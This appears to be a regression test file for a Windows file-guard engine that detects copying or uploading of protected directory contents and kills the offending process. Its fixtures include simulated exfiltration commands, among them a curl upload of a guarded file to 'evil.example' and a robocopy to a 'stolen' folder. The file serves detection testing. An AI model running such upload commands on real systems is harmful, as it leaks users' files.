#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
test_mine_core.py —— 地雷引擎的回归测试

重点盯住两件不能退化的事：
  1. 爆炸的威力上限：只杀执行操作的【那一个进程】（taskkill /F /PID，不带 /T）。
     唯一会让 OS 真的结束进程的用例，杀的是测试自己起的临时进程树；击杀后
     子进程必须存活，以此证明没有连带。
  2. 判定保守性：信息不足只告警；目录内搬动不触发；命令行开关不算目的地。

运行：python test_mine_core.py   （不需要管理员；不写真实取证日志）
"""
import io
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import mine_core as mc  # noqa: E402


def read_xml(objname, pid, pname):
    """构造一条 Security 4663 事件（%%4416 = ReadData/ListDirectory）。

    ProcessId 在真实事件里是十六进制，这里同样按十六进制写，避免测试和
    实现之间出现"进程表里查不到"的假象。
    """
    return (f"<Event><System><EventRecordID>1</EventRecordID></System>"
            f"<EventData>"
            f"<Data Name='ObjectName'>{objname}</Data>"
            f"<Data Name='ProcessId'>0x{pid:X}</Data>"
            f"<Data Name='ProcessName'>{pname}</Data>"
            f"<Data Name='AccessList'>%%4416</Data>"
            f"</EventData></Event>")


class Base(unittest.TestCase):
    """每个用例一个临时目录：守护目录、mines.json、事件日志都是临时的。"""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="pm-test-")
        self.guard = os.path.join(self.tmp, "guarded")
        os.makedirs(self.guard, exist_ok=True)
        self.reg_path = os.path.join(self.tmp, "mines.json")
        self.log_path = os.path.join(self.tmp, "events.log")
        self._old_jsonl, self._old_kill = mc.LOG_JSONL, mc.LOG_KILL
        mc.LOG_JSONL = self.log_path
        mc.LOG_KILL = os.path.join(self.tmp, "kills.txt")

    def tearDown(self):
        mc.LOG_JSONL, mc.LOG_KILL = self._old_jsonl, self._old_kill
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _mine(self, action=mc.ACTION_WARN, path=None):
        return [{"path": path or self.guard, "action": action,
                 "enabled": True}]

    def reg(self, mines):
        with open(self.reg_path, "w", encoding="utf-8") as f:
            json.dump({
                "settings": {"upload_monitor": False,
                             "action": mc.ACTION_EXPLODE,
                             "daemon_enabled": False},
                "mines": mines,
            }, f, ensure_ascii=False, indent=1)
        return mc.MineRegistry(path=self.reg_path)

    def _mine(self, action=mc.ACTION_WARN, path=None):
        return [{"path": path or self.guard, "action": action,
                 "enabled": True}]

    def sup(self, mines, force_warn=True):
        """默认 force_warn=True —— 测试里除了专用用例，绝不会真杀进程。"""
        return mc.MineSupervisor(self.reg(mines), force_warn=force_warn)

    def records(self):
        if not os.path.exists(self.log_path):
            return []
        with open(self.log_path, encoding="utf-8") as f:
            return [json.loads(x) for x in f.read().splitlines() if x.strip()]

    def kinds(self):
        return [r.get("kind") for r in self.records()]

    def quiet(self, fn):
        """引擎每次判定都会 print 一行 JSON；测试期间吞掉。"""
        old, buf = sys.stdout, io.StringIO()
        sys.stdout = buf
        try:
            return fn()
        finally:
            sys.stdout = old

    @staticmethod
    def birth(name, cmd, pid, ppid=700,
              parent=r"C:\Windows\System32\svchost.exe"):
        return {"pid": pid, "ppid": ppid, "name": name,
                "exe": r"C:\Windows\System32\\" + name,
                "cmdline": cmd, "parent_exe": parent}


class KillSemantics(Base):
    """威力上限（硬边界）。"""

    def test_explode_kills_single_process_only(self):
        """爆炸只杀目标 PID 本身：子进程必须存活（即没有 /T）。"""
        s = self.sup(self._mine(mc.ACTION_EXPLODE), force_warn=False)
        parent = subprocess.Popen(
            ["cmd", "/c", "ping -n 20 127.0.0.1 >nul"],
            creationflags=getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0))
        time.sleep(1.2)
        _rc, out, _err = mc.ps_run(
            "Get-CimInstance Win32_Process -Filter "
            f"\"ParentProcessId={parent.pid}\" | "
            "Select-Object -ExpandProperty ProcessId")
        self.assertTrue(out.strip(), "没找到子进程，无法验证")
        child = int(out.split()[0])

        res = self.quiet(lambda: s.fire(s.mines[0], parent.pid,
                                        "单进程击杀测试", {"file": "x"}))
        self.assertEqual(res, "explode")
        time.sleep(1.0)

        _rc2, out2, _err2 = mc.ps_run(
            "Get-CimInstance Win32_Process -Filter "
            f"\"ProcessId={child}\" | Select-Object -ExpandProperty ProcessId")
        self.assertTrue(bool(out2.strip()),
                        "子进程被连带杀死 —— 说明用了 /T，违反威力上限")
        parent.wait(timeout=5)

    def test_warn_action_never_kills(self):
        """动作=警告：只落档，OS 不收到任何终止请求。"""
        s = self.sup([{"path": self.guard, "action": mc.ACTION_WARN}],
                     force_warn=False)
        res = self.quiet(lambda: s.fire(s.mines[0], 777001, "测试",
                                                    {"file": "x"}))
        self.assertEqual(res, "warn")
        self.assertIn("KILL_DRYRUN", self.kinds())
        self.assertNotIn("KILL", self.kinds())

    def test_protected_process_refused(self):
        for name in ("lsass.exe", "csrss.exe", "explorer.exe", "svchost.exe",
                     "services.exe"):
            s = self.sup(self._mine())
            pid = 400100 + len(name)
            s.proc[pid] = {"ppid": 4, "name": name, "cmdline": "",
                           "exe": "", "created": ""}
            self.assertEqual(
                self.quiet(lambda: s.fire(s.mines[0], pid, "测试", {})),
                "refused", name)

    def test_system_pid_refused(self):
        s = self.sup(self._mine())
        for pid in (0, 4):
            self.assertEqual(
                self.quiet(lambda: s.fire(s.mines[0], pid, "测试", {})),
                "refused", pid)

    def test_self_and_ancestors_refused(self):
        """地雷不能打穿自己所在的会话。"""
        s = self.sup(self._mine())
        self.assertEqual(
            self.quiet(lambda: s.fire(s.mines[0], os.getpid(), "测试", {})),
            "refused")
        s.self_ancestors.add(424242)
        self.assertEqual(
            self.quiet(lambda: s.fire(s.mines[0], 424242, "测试", {})),
            "refused")

    def test_forensics_fields(self):
        """取证一律全量落盘：进程名/PID/父 PID/父映像名/祖先链/文件/原因。"""
        s = self.sup(self._mine())
        s.proc[700] = {"ppid": 4, "name": "svchost.exe", "cmdline": "",
                       "exe": "", "created": ""}
        s.proc[500201] = {"ppid": 700, "name": "python.exe",
                          "cmdline": "python.exe copier.py",
                          "exe": "C:\\Python\\python.exe", "created": ""}
        self.quiet(lambda: s.fire(s.mines[0], 500201, "测试原因",
                                                     {"file": "D:\\a.txt"}))
        hits = [r for r in self.records()
                if r.get("kind") in ("KILL", "KILL_DRYRUN")]
        self.assertTrue(hits, "没有产生任何取证记录")
        rec = hits[-1]
        for key in ("pid", "name", "ppid", "parent", "ancestry", "file",
                    "reason", "mine", "path"):
            self.assertIn(key, rec, f"取证缺字段 {key}")
        self.assertEqual(rec["ppid"], 700)
        self.assertEqual(rec["parent"], "svchost.exe")
        self.assertEqual(rec["file"], "D:\\a.txt")

    def test_taskkill_command_has_no_tree_flag(self):
        """静态约束：源码里不得再出现 taskkill 的 /T（连带子进程树）。"""
        src_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                 "mine_core.py")
        with open(src_path, encoding="utf-8") as fh:
            src = fh.read()
        for pat in (r"taskkill[^\n]*\"/T\"", r"taskkill[^\n]*'/T'",
                   r"taskkill[^\n]*\s/T\s"):
            self.assertIsNone(re.search(pat, src),
                              f"发现树形击杀：{pat}")


class Judgement(Base):
    """两层探测的判定边界。"""

    def _fire_birth(self, action, name, cmd, pid, ppid=700, parent=None):
        s = self.sup(self._mine(action))
        ev = self.birth(name, cmd, pid, ppid,
                        parent or r"C:\Windows\System32\svchost.exe")
        self.quiet(lambda: s.register_birth(ev))
        self.quiet(lambda: s.check_birth(s.mines[0], ev))
        return self.kinds()

    def test_layer_b_outside_directory_fires(self):
        src = os.path.join(self.guard, "notes")
        kinds = self._fire_birth(
            mc.ACTION_EXPLODE, "robocopy.exe",
            f'robocopy.exe "{src}" "C:\\temp\\stolen" /E', 500101,
            ppid=123, parent=r"C:\Windows\explorer.exe")
        self.assertIn("KILL_DRYRUN", kinds)

    def test_layer_b_url_destination_fires(self):
        f = os.path.join(self.guard, "a.txt")
        kinds = self._fire_birth(
            mc.ACTION_EXPLODE, "curl.exe",
            f'curl -T "{f}" https://evil.example/upload', 500102)
        self.assertIn("KILL_DRYRUN", kinds)

    def test_layer_b_inside_directory_does_not_fire(self):
        dest = os.path.join(self.guard, "dist")
        kinds = self._fire_birth(
            mc.ACTION_EXPLODE, "robocopy.exe",
            f'robocopy.exe "{self.guard}" "{dest}" /E', 500104)
        self.assertEqual(kinds, [])

    def test_layer_b_command_switches_are_not_destinations(self):
        """copy 目录内文件带 /Y 开关 —— 不该被当成"搬运到目录外"。"""
        f = os.path.join(self.guard, "a.txt")
        kinds = self._fire_birth(
            mc.ACTION_EXPLODE, "xcopy.exe",
            f'xcopy "{f}" /Y /H', 500105)
        self.assertEqual(kinds, [],
                         "/Y /H 是开关，不该当目的地 —— 否则误杀用户的目录内备份")

    def test_layer_b_shell_in_session_only_warns(self):
        """会话树内的 shell 只告警：真正的搬运者会以自己的出生事件被击杀。

        父进程刻意用 BASE_TREE_WARN_ROOTS 里的系统进程名（explorer.exe），
        这样用例不依赖本机 watch-config.json 里配了哪些宿主应用。
        """
        src = os.path.join(self.guard, "*")
        kinds = self._fire_birth(
            mc.ACTION_EXPLODE, "cmd.exe",
            f'cmd.exe /c copy "{src}" D:\\backup', 500103,
            ppid=14012, parent=r"C:\Windows\explorer.exe")
        self.assertNotIn("KILL_DRYRUN", kinds)
        self.assertIn("WARN", kinds)

    def test_layer_a_headless_dangerous_fires(self):
        s = self.sup(self._mine())
        s.proc[700] = {"ppid": 4, "name": "svchost.exe", "cmdline": "",
                       "exe": "", "created": ""}
        pid = 500205
        s.proc[pid] = {"ppid": 700, "name": "python.exe",
                       "cmdline": "python.exe copier.py",
                       "exe": "C:\\Python\\python.exe", "created": ""}
        self.quiet(lambda: s.check_read(
            s.mines[0],
            read_xml(os.path.join(self.guard, "a.txt"), pid,
                     r"C:\Python\python.exe")))
        self.assertIn("KILL_DRYRUN", self.kinds())

    def test_layer_a_unknown_origin_only_warns(self):
        """来源无法确认时，「不知道」不等于「可疑」。"""
        s = self.sup(self._mine())
        pid = 500206
        s.proc[pid] = {"ppid": 999999, "name": "python.exe", "cmdline": "",
                       "exe": "", "created": "", "ppid_name": ""}
        self.quiet(lambda: s.check_read(
            s.mines[0],
            read_xml(os.path.join(self.guard, "b.txt"), pid,
                     r"C:\Python\python.exe")))
        self.assertNotIn("KILL_DRYRUN", self.kinds())
        self.assertIn("WARN", self.kinds())

    def test_layer_a_ignores_write_access(self):
        """只关心内容读（%%4416）；写（%%4417）不触发。"""
        s = self.sup(self._mine())
        pid = 500207
        s.proc[pid] = {"ppid": 700, "name": "python.exe", "cmdline": "",
                       "exe": "", "created": ""}
        xml = read_xml(os.path.join(self.guard, "c.txt"), pid,
                       r"C:\Python\python.exe").replace("%%4416", "%%4417")
        self.quiet(lambda: s.check_read(s.mines[0], xml))
        self.assertEqual(self.kinds(), [])


class PathOwnership(unittest.TestCase):
    """守护目录的归属判定：a\\dir 不能误吞 a\\dir2。"""

    def test_owns_path(self):
        m = mc.Mine("m-x", r"E:\my-project")
        self.assertTrue(m.owns_path(r"e:\my-project\a\b.py"))
        self.assertFalse(m.owns_path(r"e:\my-project2\a.py"))
        self.assertTrue(m.owns_path(r"e:\my-project"))

    def test_owns_cmd(self):
        m = mc.Mine("m-x", r"E:\my-project")
        self.assertTrue(m.owns_cmd(r'copy "E:\my-project\a.py" D:\x'))
        self.assertFalse(m.owns_cmd(r'copy "E:\my-project2\a.py" D:\x'))
        self.assertTrue(m.owns_cmd("copy E:/my-project/a.py D:/x"))


class Config(Base):
    """配置读写：清单、默认动作、持久化。"""

    def test_default_mine_is_script_dir(self):
        reg = self.reg([])
        self.assertEqual(len(reg.mines), 1)
        self.assertEqual(os.path.normcase(reg.mines[0].path),
                         os.path.normcase(mc.HERE))

    def test_add_is_idempotent_by_path(self):
        reg = self.reg([])
        m1, c1 = reg.add(self.guard)
        m2, c2 = reg.add(self.guard)
        self.assertTrue(c1)
        self.assertFalse(c2)
        self.assertEqual(m1.id, m2.id)

    def test_roundtrip(self):
        reg = self.reg([{"path": self.guard, "action": mc.ACTION_WARN,
                         "enabled": False}])
        reg.settings["upload_monitor"] = True
        reg.save()
        again = mc.MineRegistry(path=self.reg_path)
        self.assertEqual(len(again.mines), 1)
        self.assertEqual(again.mines[0].action, mc.ACTION_WARN)
        self.assertFalse(again.mines[0].enabled)
        self.assertTrue(again.settings["upload_monitor"])

    def test_unknown_action_falls_back_to_safe_default(self):
        m = mc.Mine("m-y", self.guard, action="核弹")
        self.assertEqual(m.action, mc.ACTION_EXPLODE)


if __name__ == "__main__":
    unittest.main(verbosity=2)
